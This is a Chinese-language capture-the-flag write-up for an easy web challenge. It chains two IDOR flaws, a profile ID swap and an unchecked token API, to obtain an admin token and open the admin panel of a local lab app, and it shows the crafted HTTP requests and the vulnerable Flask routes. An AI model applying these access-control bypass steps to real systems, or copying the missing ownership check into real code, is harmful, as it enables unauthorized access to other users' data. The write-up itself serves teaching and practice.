# Writeup: 员工信息管理系统（IDOR）

## 题目信息

- 名称：员工信息管理系统
- 类型：Web
- 难度：入门 / Easy
- 考点：IDOR, HTTP 请求分析, Cookie/Session, API 调用, 自定义 Header 鉴权
- 目标：获取管理员面板中的 Flag

## 攻击步骤

### 1. 注册普通用户并登录

访问题目首页，点击注册，填写用户名、密码及其他信息，完成注册。登录后进入仪表板。


### 2. 观察正常功能并发现可疑 URL

在仪表板中点击"我的资料"，浏览器跳转到类似 /profile/2 的地址（数字为当前用户的 ID）。注意到 URL 中包含可变的数字参数，猜想可以通过修改 ID 查看其他用户资料。


### 3. 第一次 IDOR：越权访问管理员资料

将 URL 中的 ID 改为 1，访问 /profile/1。

页面成功加载，显示管理员（admin）的详细信息。其中包含两个关键信息：

- 内部 ID：admin-001
- 提示：API 凭证服务位于 /api/token，需携带内部 ID 请求。

这说明后端在处理 /profile/<id> 时没有校验当前用户是否有权访问该 ID，存在第一次 IDOR 漏洞。


### 4. 第二次 IDOR：调用 API 获取管理员 Token

根据页面提示，构造 GET 请求：

GET /api/token?uid=admin-001 HTTP/1.1
Cookie: session=<当前登录用户的 session>


服务器返回 JSON 数据：

```json
{
  "uid": "admin-001",
  "username": "admin",
  "api_token": "e09abff3dbbd3bd4e4b6a67fc9398339"
}
```

此 API 同样只检查了用户是否登录，未校验请求者是否有权获取指定 internal_id 对应的 token，属于第二次 IDOR 漏洞。

### 5. 使用 Token 访问管理员面板

管理员面板位于 /admin，需要通过请求头 X-Admin-Token 传递正确的 Token。


在 Burp Repeater 中构造如下请求：

```
GET /admin HTTP/1.1
Host: 127.0.0.1:5000
Cookie: session=eyJlc2VvX2lkIjoyfQ.a07lqq.THGda79Fj-2PaQGKR4fWIITXcFw
X-Admin-Token: e09abff3dbbd3bd4e4b6a67fc9398339
Connection: close
```

发送后，响应中包含：

```html
<h2>管理员面板</h2>
<p>恭喜！Flag 是：<strong>flag{test_flag}</strong></p>
```

## 漏洞原理分析

### 第一次 IDOR：/profile/<int:user_id>

在 app.py 的 /profile/<int:user_id> 路由中，代码仅检查了用户是否登录（session 存在），却没有检查 user_id 是否等于当前登录用户的 ID：

```python
@app.route('/profile/<int:user_id>')
def profile(user_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    target = get_user_by_id(user_id)   # 未校验所有权
    ...
```

因此，任何已登录用户都可以通过修改 user_id 查看任意用户信息，包括管理员的 internal_id 和 API 调用提示。

### 第二次 IDOR：/api/token

在 /api/token 路由中，代码仅检查用户是否登录，未验证请求者是否有权获取指定 internal_id 对应的 api_token：

```python
@app.route('/api/token', methods=['GET'])
def get_token():
    if 'user_id' not in session:
        return {"error": "未登录"}, 401
    internal_id = request.args.get('uid')
    user = conn.execute('SELECT * FROM users WHERE internal_id = ?', (internal_id,)).fetchone()
    # 未检查当前用户是否有权访问该 internal_id
    return {"api_token": user['api_token']}
```

攻击者利用第一次 IDOR 获得 internal_id，再利用第二次 IDOR 获得 api_token，完成权限提升。

## 工具与命令参考

Burp Suite 操作

拦截 /profile/1 请求，观察响应中的内部 ID 和 API 提示。

发送 /api/token?uid=admin-001 请求，获取 Token。

将请求发送至 Repeater，修改路径为 /admin，添加 X-Admin-Token 头并发送。

## 总结

本题通过两次 IDOR 漏洞，引导参赛者完成信息收集、API 探测、自定义 Header 鉴权绕过等操作，适合新人掌握对象级访问控制缺陷的利用方法。整个攻击链自然流畅，考察了以下核心技能：

HTTP 请求分析与构造

Cookie / Session 管理

URL 参数篡改

API 调用与 JSON 解析

自定义请求头鉴权绕过